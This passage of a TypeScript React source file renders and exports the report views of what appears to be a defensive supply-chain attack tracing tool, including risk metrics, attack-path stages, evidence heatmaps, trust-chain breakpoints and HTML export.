      while (lineIndex < lines.length && isAssistantTableRow(lines[lineIndex].trim())) {
        rows.push(parseAssistantTableRow(lines[lineIndex].trim()))
        lineIndex += 1
      }
      lineIndex -= 1
      blocks.push({ type: 'table', headers, rows })
      continue
    }

    const quote = line.match(/^>\s?(.*)$/)
    if (quote) {
      flushText()
      blocks.push({ type: 'quote', text: cleanMarkdownText(quote[1]) })
      continue
    }

    const list = line.match(/^([-*]|\d+[.)])\s+(.*)$/)
    if (list) {
      flushParagraph()
      const ordered = /^\d/.test(list[1])
      if (listItems.length && ordered !== listOrdered) flushList()
      listOrdered = ordered
      listItems.push(cleanMarkdownText(list[2]))
      continue
    }

    flushList()
    paragraphLines.push(line)
  }

  if (codeLines.length) blocks.push({ type: 'code', text: codeLines.join('\n') })
  flushText()
  return blocks.length ? blocks : [{ type: 'paragraph', text }]
}

function isAssistantTableRow(line: string) {
  return line.includes('|') && /^\|?.+\|$/.test(line)
}

function isAssistantTableDivider(line: string) {
  if (!isAssistantTableRow(line)) return false
  const cells = parseAssistantTableRow(line)
  return cells.length > 0 && cells.every((cell) => /^:?-{3,}:?$/.test(cell.replace(/\s/g, '')))
}

function parseAssistantTableRow(line: string) {
  return line.replace(/^\|/, '').replace(/\|$/, '').split('|').map((cell) => cleanMarkdownText(cell))
}

function cleanMarkdownText(text: string) {
  return text.replace(/\s+/g, ' ').trim()
}

function renderInlineMarkdown(text: string): ReactNode {
  const parts = text.split(/(\*\*[^*]+\*\*|`[^`]+`)/g).filter(Boolean)
  return parts.map((part, index) => {
    if (part.startsWith('**') && part.endsWith('**')) {
      return (
        <strong key={`${part}-${index}`} className='font-semibold text-foreground'>
          {part.slice(2, -2)}
        </strong>
      )
    }
    if (part.startsWith('`') && part.endsWith('`')) {
      return (
        <code key={`${part}-${index}`} className='rounded bg-muted px-1.5 py-0.5 font-mono text-[0.85em] text-cyan-700 dark:text-cyan-300'>
          {part.slice(1, -1)}
        </code>
      )
    }
    return <span key={`${part}-${index}`}>{part}</span>
  })
}

function CopyAnswerButton({ text }: { text: string }) {
  return (
    <UiTooltip>
      <UiTooltipTrigger asChild>
        <Button
          variant='ghost'
          size='icon'
          className='size-7 rounded-md'
          onClick={() => {
            void navigator.clipboard.writeText(text)
            toast.success('回答已复制')
          }}
        >
          <Copy className='size-3.5' />
        </Button>
      </UiTooltipTrigger>
      <UiTooltipContent>复制回答</UiTooltipContent>
    </UiTooltip>
  )
}

function EvidenceItem({ value }: { value: string }) {
  const [kind, ...rest] = value.split(':')
  const detail = rest.join(':').trim() || value
  return (
    <div className='rounded-md border bg-background p-3'>
      <div className='mb-2 flex items-center justify-between gap-2'>
        <Badge variant='outline' className='rounded-md'>
          {rest.length ? kind : 'Evidence'}
        </Badge>
        <CheckCircle2 className='size-4 text-emerald-600' />
      </div>
      <code className='code-evidence' title={detail}>
        {detail}
      </code>
    </div>
  )
}

function _OldReportPanel({ workspace, animationKey }: { workspace: SecurityWorkspace; animationKey: number }) {
  const [reportMode, setReportMode] = useState<'preview' | 'source'>('preview')
  const report = normalizeReportForDisplay(getWorkspaceReport(workspace), workspace)
  const workspaceId = workspace.workspaceId || workspace.workspace?.workspaceId

  async function exportEvidencePackage() {
    if (!workspaceId) {
      toast.error('当前工作台还没有 workspaceId，请先从案例导入页创建调查工作空间')
      return
    }
    try {
      const blob = await downloadWorkspaceEvidencePackage(workspaceId)
      downloadBlob(blob, `${workspaceId}-evidence-package.zip`)
      toast.success('证据包已导出')
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '证据包导出失败')
    }
  }

  return (
    <Card className='rounded-md'>
      <CardHeader>
        <div className='flex flex-wrap items-center justify-between gap-3'>
          <div>
            <CardTitle className='flex items-center gap-2 text-base'>
              <FileText className='size-4 text-orange-600' />
              APT 供应链攻击溯源报告
            </CardTitle>
          </div>
          <div className='flex flex-wrap gap-2'>
            <Button variant='outline' size='sm' onClick={() => void exportEvidencePackage()}>
              <PackageCheck />
              导出证据包
            </Button>
            <Button variant='outline' size='sm' onClick={() => downloadReport(report)}>
              <Download />
              导出 Markdown
            </Button>
            <Button variant='outline' size='sm' onClick={() => downloadHtmlReport(workspace, report)}>
              <FileText />
              导出 HTML
            </Button>
          </div>
        </div>
      </CardHeader>
      <CardContent className='space-y-4'>
        <Tabs value={reportMode} onValueChange={(value) => setReportMode(value as 'preview' | 'source')}>
          <TabsList className='grid h-10 w-full max-w-sm grid-cols-2 rounded-md'>
            <TabsTrigger value='preview'>报告预览</TabsTrigger>
            <TabsTrigger value='source'>Markdown 源码</TabsTrigger>
          </TabsList>
          <TabsContent value='preview' className='mt-4'>
            <VisualReportPreview
              key={`report-preview-${animationKey}`}
              workspace={workspace}
              report={report}
              animationKey={animationKey}
            />
          </TabsContent>
          <TabsContent value='source' className='mt-4'>
            <Textarea
              value={report}
              readOnly
              className='min-h-[640px] resize-none rounded-md font-mono text-xs leading-5'
            />
          </TabsContent>
        </Tabs>
      </CardContent>
    </Card>
  )
}

function VisualReportPreview({
  workspace,
  report,
  animationKey,
}: {
  workspace: SecurityWorkspace
  report: string
  animationKey: number
}) {
  const metrics = buildReportMetrics(workspace)
  const riskSources = buildReportRiskSources(workspace)
  const stages = buildReportPathStages(workspace)
  const breakpoints = buildReportTrustBreakpoints(workspace)
  const summaryParagraphs = extractReportParagraphs(report, 4)
  const primaryPath = pickPrimaryReportPath(workspace)

  return (
    <div className='max-h-[720px] overflow-auto rounded-md border bg-background'>
      <div className='space-y-5 p-4 lg:p-5'>
        <section className='grid gap-4 xl:grid-cols-[minmax(0,1fr)_320px]'>
          <div className='rounded-md border bg-muted/20 p-4'>
            <Badge variant='outline' className='rounded-md border-red-200 bg-red-50 text-red-700'>
              {workspace.summary.risk_level.toUpperCase()} · 供应链溯源研判
            </Badge>
            <h2 className='mt-3 text-xl font-semibold tracking-normal'>{workspace.workspace.name}</h2>
            <p className='mt-2 max-w-4xl text-sm leading-6 text-muted-foreground'>
              {primaryPath?.conclusion || primaryPath?.description || getAssistantPayload(workspace).answer}
            </p>
            <div className='mt-4 grid gap-3 sm:grid-cols-2 xl:grid-cols-3'>
              {metrics.map((metric) => (
                <ReportMetricCard key={metric.label} {...metric} />
              ))}
            </div>
          </div>
          <RiskDial key={`report-risk-${animationKey}`} score={workspace.summary.risk_score} level={workspace.summary.risk_level} />
        </section>

        <section className='grid gap-4 xl:grid-cols-[minmax(0,0.9fr)_minmax(0,1.1fr)]'>
          <Card className='rounded-md'>
            <CardHeader className='pb-2'>
              <CardTitle className='flex items-center gap-2 text-base'>
                <TrendingUp className='size-4 text-red-600' />
                风险来源分布
              </CardTitle>
            </CardHeader>
            <CardContent>
              <ResponsiveContainer width='100%' height={260}>
                <BarChart data={riskSources} margin={{ left: -20, right: 12, top: 10, bottom: 0 }}>
                  <CartesianGrid strokeDasharray='3 3' className='stroke-muted' />
                  <XAxis dataKey='name' tickLine={false} axisLine={false} fontSize={12} />
                  <YAxis tickLine={false} axisLine={false} fontSize={12} />
                  <Tooltip />
                  <Bar
                    key={`${animationKey}-${riskSources.map((item) => `${item.name}:${item.value}`).join('|')}`}
                    dataKey='value'
                    name='信号'
                    fill='#0891b2'
                    radius={[4, 4, 0, 0]}
                    isAnimationActive
                    animationBegin={0}
                    animationDuration={3200}
                    animationEasing='ease-out'
                    shape={<AnimatedRiskSourceBar />}
                  />
                </BarChart>
              </ResponsiveContainer>
            </CardContent>
          </Card>

          <Card className='rounded-md'>
            <CardHeader className='pb-2'>
              <CardTitle className='flex items-center gap-2 text-base'>
                <Route className='size-4 text-cyan-600' />
                攻击路径流程
              </CardTitle>
            </CardHeader>
            <CardContent>
              <ReportPathFlow stages={stages} />
            </CardContent>
          </Card>
        </section>

        <section className='grid gap-4 xl:grid-cols-[minmax(0,1fr)_360px]'>
          <Card className='rounded-md'>
            <CardHeader className='pb-2'>
              <CardTitle className='flex items-center gap-2 text-base'>
                <ClipboardList className='size-4 text-emerald-600' />
                证据覆盖热力图
              </CardTitle>
            </CardHeader>
            <CardContent>
              <ReportEvidenceHeatmap stages={stages} />
            </CardContent>
          </Card>

          <Card className='rounded-md'>
            <CardHeader className='pb-2'>
              <CardTitle className='flex items-center gap-2 text-base'>
                <AlertTriangle className='size-4 text-orange-600' />
                可信链断点
              </CardTitle>
            </CardHeader>
            <CardContent className='space-y-3'>
              {breakpoints.length ? (
                breakpoints.map((item) => (
                  <div key={item.id} className='min-w-0 overflow-hidden rounded-md border border-red-100 bg-red-50/60 p-3 dark:border-red-900 dark:bg-red-950/20'>
                    <div className='flex min-w-0 items-center justify-between gap-2'>
                      <div className='min-w-0 break-words font-medium [overflow-wrap:anywhere]'>{item.title}</div>
                      <Badge variant='outline' className={cn('rounded-md', severityClasses[item.severity])}>
                        {severityLabels[item.severity]}
                      </Badge>
                    </div>
                    <p
                      className='mt-2 min-w-0 max-w-full whitespace-pre-wrap break-all text-xs leading-5 text-muted-foreground [overflow-wrap:anywhere] [word-break:break-all]'
                      title={item.evidence}
                      style={{ overflowWrap: 'anywhere', wordBreak: 'break-all' }}
                    >
                      {item.evidence}
                    </p>
                  </div>
                ))
              ) : (
                <div className='rounded-md border bg-muted/20 p-3 text-sm text-muted-foreground'>
                  当前没有发现 digest、commit、builder、runner 或签名阻断项。
                </div>
              )}
            </CardContent>
          </Card>
        </section>

        <Card className='rounded-md'>
          <CardHeader className='pb-2'>
            <CardTitle className='flex items-center gap-2 text-base'>
              <FileText className='size-4 text-orange-600' />
              正文摘要
            </CardTitle>
          </CardHeader>
          <CardContent className='grid gap-3 md:grid-cols-2'>
            {summaryParagraphs.map((paragraph, index) => (
              <div key={`${index}-${paragraph.slice(0, 24)}`} className='rounded-md border bg-muted/15 p-3 text-sm leading-6 text-muted-foreground'>
                {paragraph}
              </div>
            ))}
          </CardContent>
        </Card>
      </div>
    </div>
  )
}

function ReportMetricCard({
  label,
  value,
  detail,
  tone,
}: {
  label: string
  value: string
  detail: string
  tone: 'red' | 'cyan' | 'orange' | 'emerald' | 'slate'
}) {
  const toneClass = {
    red: 'text-red-600',
    cyan: 'text-cyan-600',
    orange: 'text-orange-600',
    emerald: 'text-emerald-600',
    slate: 'text-slate-600 dark:text-muted-foreground',
  }[tone]

  return (
    <div className='rounded-md border bg-background p-3'>
      <div className='text-xs text-muted-foreground'>{label}</div>
      <div className={cn('mt-1 text-2xl font-semibold', toneClass)}>{value}</div>
      <div className='mt-1 truncate text-xs text-muted-foreground'>{detail}</div>
    </div>
  )
}

function ReportPathFlow({ stages }: { stages: ReportPathStage[] }) {
  if (!stages.length) {
    return <div className='rounded-md border bg-muted/20 p-4 text-sm text-muted-foreground'>暂无路径阶段，先生成攻击链地图后再查看。</div>
  }

  return (
    <div className='grid gap-3 md:grid-cols-2 xl:grid-cols-3'>
      {stages.slice(0, 6).map((stage, index) => (
        <div key={stage.id} className='relative rounded-md border bg-background p-3'>
          <div className='flex items-start justify-between gap-2'>
            <div className='min-w-0'>
              <div className='text-xs text-muted-foreground'>阶段 {index + 1}</div>
              <div className='mt-1 break-words font-semibold [overflow-wrap:anywhere]'>{stage.title}</div>
            </div>
            <Badge variant='outline' className='rounded-md'>{stage.confidence}%</Badge>
          </div>
          <div className='mt-3 rounded-md bg-muted/35 p-2 text-xs leading-5'>
            <div className='break-all font-medium'>{stage.source}</div>
            <div className='text-muted-foreground'>→</div>
            <div className='break-all font-medium'>{stage.target}</div>
          </div>
        </div>
      ))}
    </div>
  )
}

function ReportEvidenceHeatmap({ stages }: { stages: ReportPathStage[] }) {
  const evidenceTypes = ['组件', 'CI/CD', '产物', '日志', '外部告警', '代码']
  const visibleStages = stages.slice(0, 6)

  if (!visibleStages.length) {
    return <div className='rounded-md border bg-muted/20 p-4 text-sm text-muted-foreground'>暂无可展示的证据覆盖矩阵。</div>
  }

  return (
    <div className='overflow-auto rounded-md border'>
      <div className='grid min-w-[780px] border-b bg-muted/35 text-xs font-medium text-muted-foreground' style={{ gridTemplateColumns: `180px repeat(${evidenceTypes.length}, minmax(88px, 1fr))` }}>
        <div className='p-2'>路径阶段</div>
        {evidenceTypes.map((type) => <div key={type} className='p-2 text-center'>{type}</div>)}
      </div>
      {visibleStages.map((stage) => (
        <div key={stage.id} className='grid min-w-[780px] border-b last:border-b-0' style={{ gridTemplateColumns: `180px repeat(${evidenceTypes.length}, minmax(88px, 1fr))` }}>
          <div className='p-2'>
            <div className='break-words text-sm font-medium [overflow-wrap:anywhere]'>{stage.title}</div>
          </div>
          {evidenceTypes.map((type) => {
            const active = stage.evidenceGroups.includes(type)
            return (
              <div key={`${stage.id}-${type}`} className='p-2'>
                <div className={cn('rounded-md px-2 py-2 text-center text-xs', active ? 'bg-emerald-100 text-emerald-800 dark:bg-emerald-950/45 dark:text-emerald-200' : 'bg-muted/40 text-muted-foreground')}>
                  {active ? `${Math.max(stage.evidenceCount, 1)} 条` : '缺口'}
                </div>
              </div>
            )
          })}
        </div>
      ))}
    </div>
  )
}

function RiskBar({ value }: { value: number }) {
  const { value: displayValue, spring } = useAnimatedNumber(value, {
    stiffness: 115,
    damping: 20,
    delayMs: 520,
    durationMs: 3000,
    respectReducedMotion: false,
  })
  const width = useTransform(spring, (latest) => `${Math.max(0, Math.min(100, latest))}%`)
  const color =
    value >= 90
      ? 'bg-red-600'
      : value >= 75
        ? 'bg-orange-500'
        : value >= 60
          ? 'bg-amber-500'
          : 'bg-emerald-500'

  return (
    <div className='space-y-1'>
      <div className='h-2 overflow-hidden rounded-full bg-muted'>
        <motion.div
          className={cn('h-full rounded-full', color)}
          style={{ width }}
        />
      </div>
      <div className='text-right text-xs text-muted-foreground'>{displayValue}</div>
    </div>
  )
}

function AnimatedRiskSourceBar(props: {
  x?: number
  y?: number
  width?: number
  height?: number
  fill?: string
  index?: number
}) {
  const { x = 0, y = 0, width = 0, height = 0, fill = '#0891b2', index = 0 } = props
  const progress = useMotionValue(0)
  const spring = useSpring(progress, { stiffness: 22, damping: 10, mass: 1 })
  const animatedHeight = useTransform(spring, [0, 1], [0, height])
  const animatedY = useTransform(spring, [0, 1], [y + height, y])
  const opacity = useTransform(spring, [0, 0.25, 1], [0.35, 0.8, 1])
  const capOpacity = useTransform(spring, [0, 0.55, 1], [0, 0.85, 0.18])

  useEffect(() => {
    progress.jump(0)
    const timeoutId = window.setTimeout(() => progress.set(1), index * 90)
    return () => window.clearTimeout(timeoutId)
  }, [progress, height, index])

  return (
    <g>
      <motion.rect
        x={x}
        y={animatedY}
        width={width}
        height={animatedHeight}
        rx={4}
        fill={fill}
        opacity={opacity}
      />
      <motion.rect
        x={x}
        y={animatedY}
        width={width}
        height={3}
        rx={2}
        fill='#67e8f9'
        opacity={capOpacity}
      />
    </g>
  )
}

function compactNumber(value: number) {
  if (value >= 1000000) return `${(value / 1000000).toFixed(1)}M`
  if (value >= 1000) return `${(value / 1000).toFixed(1)}K`
  return value.toString()
}

function formatBytes(value: number) {
  if (value >= 1024 * 1024 * 1024) return `${(value / (1024 * 1024 * 1024)).toFixed(1)} GB`
  if (value >= 1024 * 1024) return `${(value / (1024 * 1024)).toFixed(1)} MB`
  if (value >= 1024) return `${(value / 1024).toFixed(1)} KB`
  return `${value} B`
}

function formatTimestamp(value?: string | null) {
  return formatLocalDateTime(value, { includeSeconds: true })
}

function formatPercent(value: number) {
  return `${Math.round(value * 100)}%`
}

function scannerStateLabel(state: string | undefined, available: boolean) {
  if (state === 'skipped') return '已跳过'
  if (state === 'missing') return '未安装'
  if (state === 'fallback') return '降级'
  if (state === 'partial') return '部分成功'
  if (state === 'timeout') return '超时'
  if (state === 'failed') return '异常'
  return available ? '可用' : '不可用'
}

function scannerBadgeClass(state: string | undefined, available: boolean) {
  if (state === 'ok') return cn('rounded-md', statusClasses.active)
  if (state === 'skipped') return cn('rounded-md', statusClasses.observed)
  if (state === 'fallback' || state === 'partial' || state === 'timeout') return cn('rounded-md', severityClasses.medium)
  if (state === 'missing' || state === 'failed') return cn('rounded-md', severityClasses.high)
  return cn('rounded-md', available ? statusClasses.active : severityClasses.medium)
}

function downloadReport(report: string) {
  const blob = new Blob([report], { type: 'text/markdown;charset=utf-8' })
  downloadBlob(blob, 'supply-chain-security-report.md')
  toast.success('报告已导出')
}

function downloadHtmlReport(workspace: SecurityWorkspace, report: string) {
  const html = buildReportHtml(workspace, report)
  const blob = new Blob([html], { type: 'text/html;charset=utf-8' })
  downloadBlob(blob, 'supply-chain-security-report.html')
  toast.success('HTML 报告已导出')
}

function downloadBlob(blob: Blob, filename: string) {
  const url = URL.createObjectURL(blob)
  const link = document.createElement('a')
  link.href = url
  link.download = filename
  document.body.appendChild(link)
  link.click()
  link.remove()
  URL.revokeObjectURL(url)
}

function downloadJson(payload: unknown, filename: string) {
  const blob = new Blob([JSON.stringify(payload, null, 2)], {
    type: 'application/sarif+json;charset=utf-8',
  })
  const url = URL.createObjectURL(blob)
  const link = document.createElement('a')
  link.href = url
  link.download = filename
  document.body.appendChild(link)
  link.click()
  link.remove()
  URL.revokeObjectURL(url)
}

type ReportPathStage = {
  id: string
  title: string
  source: string
  target: string
  relationship: string
  confidence: number
  evidenceCount: number
  evidenceGroups: string[]
  severity: 'critical' | 'high' | 'medium' | 'low'
}

type ReportMetric = {
  label: string
  value: string
  detail: string
  tone: 'red' | 'cyan' | 'orange' | 'emerald' | 'slate'
}

type ReportTrustBreakpoint = {
  id: string
  title: string
  evidence: string
  severity: 'critical' | 'high' | 'medium' | 'low'
}

function buildReportMetrics(workspace: SecurityWorkspace): ReportMetric[] {
  const primaryPath = pickPrimaryReportPath(workspace)
  const confidence = Math.round((primaryPath?.confidence ?? workspace.graph?.summary?.average_path_confidence ?? 0) * 100)
  return [
    { label: '综合风险', value: `${workspace.summary.risk_score}/100`, detail: workspace.summary.risk_level, tone: workspace.summary.risk_score >= 90 ? 'red' : 'orange' },
    { label: '攻击路径', value: `${workspace.summary.attack_paths}`, detail: '当前候选路径', tone: 'cyan' },
    { label: '高可信路径', value: `${workspace.graph?.summary?.real_attack_path_count ?? 0}`, detail: '已验证路径', tone: 'emerald' },
    { label: '证据片段', value: `${workspace.facts?.summary.evidence_count ?? workspace.summary.log_events ?? 0}`, detail: '图谱和证据合计', tone: 'slate' },
    { label: '图谱节点', value: `${workspace.graph?.summary?.node_count ?? 0}`, detail: '知识图谱规模', tone: 'cyan' },
    { label: '平均置信度', value: `${confidence}%`, detail: '路径平均评分', tone: 'orange' },
  ]
}

function buildReportRiskSources(workspace: SecurityWorkspace) {
  const dependency = workspace.dependency_audit?.summary?.finding_count ?? 0
  const cicd = workspace.cicd_audit?.summary?.finding_count ?? 0
  const artifact = workspace.artifact_trust?.summary?.finding_count ?? 0
  const logs = workspace.log_audit?.summary?.finding_count ?? 0
  const multimodal = workspace.multimodal_audit?.summary?.finding_count ?? 0
  const graph = workspace.summary.attack_paths ?? 0
  return [
    { name: '依赖', value: dependency },
    { name: 'CI/CD', value: cicd },
    { name: '产物', value: artifact },
    { name: '日志', value: logs },
    { name: '多模态', value: multimodal },
    { name: '攻击路径', value: graph },
  ]
}

function buildReportPathStages(workspace: SecurityWorkspace): ReportPathStage[] {
  const path = pickPrimaryReportPath(workspace)
  if (!path) return []
  return (path.path_steps ?? []).map((step, index) => ({
    id: `${path.id}-${index}`,
    title: step.relationship || step.edge_type || `阶段 ${index + 1}`,
    source: step.source || step.source_type || '起点待确认',
    target: step.target || step.target_type || '终点待确认',
    relationship: step.relationship || step.why_abusable || step.trust_basis || '证据串联',
    confidence: Math.round((step.confidence ?? path.confidence ?? 0) * 100),
    evidenceCount: step.evidence_ids?.length ?? 0,
    evidenceGroups: evidenceGroupsForReportStage(`${step.source_type || ''} ${step.target_type || ''} ${step.relationship || ''} ${step.why_abusable || ''}`),
    severity: path.severity,
  }))
}

function buildReportTrustBreakpoints(workspace: SecurityWorkspace): ReportTrustBreakpoint[] {
  const artifact = workspace.artifact_trust
  if (!artifact?.checks) return []
  return artifact.checks
    .filter((check) => ['fail', 'warn', 'missing'].includes(String(check.status)))
    .slice(0, 4)
    .map((check, index) => ({
      id: `${check.name || 'check'}-${index}`,
      title: artifactCheckTitle(check.name || '可信链断点'),
      evidence: check.evidence || '需要复核',
      severity: check.status === 'fail' ? 'critical' : check.status === 'warn' ? 'high' : 'medium',
    }))
}

function pickPrimaryReportPath(workspace: SecurityWorkspace) {
  const paths = workspace.graph?.attack_paths ?? []
  if (!paths.length) return null
  return [...paths].sort((a, b) => (b.confidence ?? 0) - (a.confidence ?? 0))[0] ?? null
}

function evidenceGroupsForReportStage(text: string) {
  const normalized = text.toLowerCase()
  const groups = new Set<string>()
  if (/dependency|package|sbom|vex|漏洞|依赖/.test(normalized)) groups.add('组件')
  if (/workflow|runner|ci|cicd|action|build|构建/.test(normalized)) groups.add('CI/CD')
  if (/artifact|attestation|provenance|digest|hash|产物|签名/.test(normalized)) groups.add('产物')
  if (/log|runtime|外联|访问|事件|运行/.test(normalized)) groups.add('日志')
  if (/image|audio|video|ocr|asr|截图|告警/.test(normalized)) groups.add('外部告警')
  if (/code|import|call|路径|调用|源码/.test(normalized)) groups.add('代码')
  return [...groups]
}

function extractReportParagraphs(markdown: string, limit: number) {
  return String(markdown ?? '')
    .split('\n')
    .map((line) => line.trim())
    .filter((line) => line && !line.startsWith('#') && !line.startsWith('-') && !line.startsWith('|'))
    .slice(0, limit)
}

function buildReportHtml(workspace: SecurityWorkspace, report: string) {
  const metrics = buildReportMetrics(workspace)
  const riskSources = buildReportRiskSources(workspace)
  const path = pickPrimaryReportPath(workspace)
  const breakpoints = buildReportTrustBreakpoints(workspace)
  const paragraphs = extractReportParagraphs(report, 6)
  const htmlMetrics = metrics
    .map((item) => `<div class="metric"><div class="label">${escapeHtml(item.label)}</div><div class="value tone-${item.tone}">${escapeHtml(item.value)}</div><div class="detail">${escapeHtml(item.detail)}</div></div>`)
    .join('')
  const htmlRiskSources = riskSources
    .map((item) => `<div class="bar-row"><span>${escapeHtml(item.name)}</span><div class="bar"><i style="width:${Math.max(6, Math.min(100, item.value * 12 + 8))}%"></i></div><strong>${item.value}</strong></div>`)
    .join('')
  const htmlBreakpoints = breakpoints.length
    ? breakpoints
        .map((item) => `<div class="breakpoint breakpoint-${item.severity}"><div class="breakpoint-head"><strong>${escapeHtml(item.title)}</strong><span>${escapeHtml(item.severity)}</span></div><div class="breakpoint-body">${escapeHtml(item.evidence)}</div></div>`)
        .join('')
    : '<div class="empty">当前没有发现明显断点。</div>'
  const htmlParagraphs = paragraphs.map((item) => `<p>${escapeHtml(item)}</p>`).join('')
  const steps = path?.path_steps ?? []
  const htmlSteps = steps.length
    ? steps
        .map((step, index) => `<div class="step"><div class="step-no">阶段 ${index + 1}</div><h3>${escapeHtml(step.relationship || step.edge_type || `阶段 ${index + 1}`)}</h3><div class="step-line">${escapeHtml(step.source || step.source_type || '-')}${escapeHtml(' → ')}${escapeHtml(step.target || step.target_type || '-')}</div><div class="step-meta">${escapeHtml(String(Math.round((step.confidence ?? path?.confidence ?? 0) * 100)))}% · ${escapeHtml(String(step.evidence_ids?.length ?? 0))} 条证据</div></div>`)
        .join('')
    : '<div class="empty">暂无路径阶段。</div>'

  return `<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>APT 供应链攻击溯源报告</title>
<style>
  :root{color-scheme:light}
  body{margin:0;font-family:Inter,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:#f6f8fb;color:#172033}
  .page{max-width:1200px;margin:0 auto;padding:28px}
  .hero{display:flex;justify-content:space-between;gap:20px;align-items:stretch;background:linear-gradient(180deg,#fff,#f8fbff);border:1px solid #dde7f3;border-radius:16px;padding:22px}
  .hero h1{margin:0 0 8px;font-size:30px}
  .hero p{margin:0;color:#5b667a;line-height:1.7;max-width:760px}
  .dial{min-width:180px;border-radius:999px;border:10px solid #ef4444;display:grid;place-items:center;font-size:44px;font-weight:800;color:#dc2626;background:#fff}
  .grid{display:grid;gap:14px;margin-top:16px}
  .metrics{grid-template-columns:repeat(3,minmax(0,1fr))}
  .metric,.panel,.step,.breakpoint{background:#fff;border:1px solid #dfe7f2;border-radius:14px;padding:14px}
  .label{font-size:12px;color:#6b7280}
  .value{margin-top:8px;font-size:28px;font-weight:800}
  .detail{margin-top:4px;color:#6b7280;font-size:12px}
  .tone-red{color:#dc2626}.tone-cyan{color:#0891b2}.tone-orange{color:#ea580c}.tone-emerald{color:#059669}.tone-slate{color:#475569}
  .two{grid-template-columns:repeat(2,minmax(0,1fr))}
  .bar-row{display:grid;grid-template-columns:70px 1fr 42px;gap:10px;align-items:center;margin-top:12px}
  .bar{height:12px;background:#edf2f7;border-radius:999px;overflow:hidden}
  .bar i{display:block;height:100%;background:linear-gradient(90deg,#0ea5e9,#22c55e);border-radius:999px}
  .path{grid-template-columns:repeat(3,minmax(0,1fr))}
  .step h3{margin:6px 0 8px;font-size:16px}
  .step-line{background:#f5f8fd;border-radius:10px;padding:10px;font-weight:600;word-break:break-all}
  .step-meta{margin-top:10px;color:#64748b;font-size:12px}
  .heatmap{border:1px solid #dfe7f2;border-radius:14px;overflow:hidden;background:#fff}
  .heat-row{display:grid;grid-template-columns:180px repeat(6,minmax(88px,1fr))}
  .heat-cell{padding:10px;border-bottom:1px solid #edf2f7;border-right:1px solid #edf2f7;font-size:12px}
  .heat-head{background:#f8fafc;color:#64748b;font-weight:700;text-align:center}
  .heat-title{font-weight:700}
  .hit{background:#dcfce7;color:#166534;font-weight:700;text-align:center}
  .miss{background:#f8fafc;color:#94a3b8;text-align:center}
  .breakpoint-critical{border-color:#fecaca;background:#fff1f2}
  .breakpoint-high{border-color:#fed7aa;background:#fff7ed}
  .breakpoint-medium{border-color:#fde68a;background:#fffbeb}
  .breakpoint-head{display:flex;justify-content:space-between;gap:8px;align-items:center}
  .breakpoint-body{margin-top:10px;color:#475569;line-height:1.6;font-size:13px}
  .summary{background:#fff;border:1px solid #dfe7f2;border-radius:14px;padding:18px;line-height:1.8}
  .summary p{margin:0 0 10px}
  .empty{padding:18px;color:#64748b}
  @media (max-width: 980px){.hero{flex-direction:column}.metrics,.two,.path{grid-template-columns:1fr}.heat-row{grid-template-columns:140px repeat(6,minmax(88px,1fr))}.page{padding:16px}}
</style>
</head>
<body>
<main class="page">
  <section class="hero">
    <div>
      <h1>APT 供应链攻击溯源报告</h1>
      <p>${escapeHtml(primaryReportSummary(workspace, path, report))}</p>
    </div>
    <div class="dial">${workspace.summary.risk_score}</div>
  </section>
  <section class="grid metrics">${htmlMetrics}</section>
  <section class="grid two">
    <div class="panel"><h2>风险来源分布</h2>${htmlRiskSources}</div>
    <div class="panel"><h2>攻击路径流程</h2><div class="grid path">${htmlSteps}</div></div>
  </section>
  <section class="grid two">
    <div class="panel">
      <h2>证据覆盖热力图</h2>
      <div class="heatmap">
        <div class="heat-row heat-head"><div class="heat-cell">路径阶段</div><div class="heat-cell">组件</div><div class="heat-cell">CI/CD</div><div class="heat-cell">产物</div><div class="heat-cell">日志</div><div class="heat-cell">外部告警</div><div class="heat-cell">代码</div></div>
        ${renderHtmlHeatRows(buildReportPathStages(workspace))}
      </div>
    </div>
    <div class="panel"><h2>可信链断点</h2>${htmlBreakpoints}</div>
  </section>
  <section class="summary">
    <h2>正文摘要</h2>
    ${htmlParagraphs}
  </section>
</main>
</body>
</html>`
}

function renderHtmlHeatRows(stages: ReportPathStage[]) {
  if (!stages.length) return '<div class="empty">暂无可展示的证据覆盖矩阵。</div>'
  return stages
    .slice(0, 6)
    .map((stage) => {
      const cells = ['组件', 'CI/CD', '产物', '日志', '外部告警', '代码']
        .map((type) => `<div class="heat-cell ${stage.evidenceGroups.includes(type) ? 'hit' : 'miss'}">${stage.evidenceGroups.includes(type) ? `${Math.max(stage.evidenceCount, 1)} 条` : '缺口'}</div>`)
        .join('')
      return `<div class="heat-row"><div class="heat-cell heat-title">${escapeHtml(stage.title)}</div>${cells}</div>`
    })
    .join('')
}

function primaryReportSummary(workspace: SecurityWorkspace, path: ReturnType<typeof pickPrimaryReportPath>, report: string) {
  const base = path?.conclusion || path?.description || getAssistantPayload(workspace).answer || ''
  const trimmed = base.trim() || extractReportParagraphs(report, 1)[0] || '当前报告展示了供应链溯源的关键结论、攻击路径和证据缺口。'
  return `${trimmed} 该页面用于答辩展示、证据复核和离线导出。`
}

function escapeHtml(value: string) {
  return value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}

function tabFromHash(hash: string): PlatformTab {
  return canonicalWorkspaceTab(normalizeWorkbenchHash(hash))
}
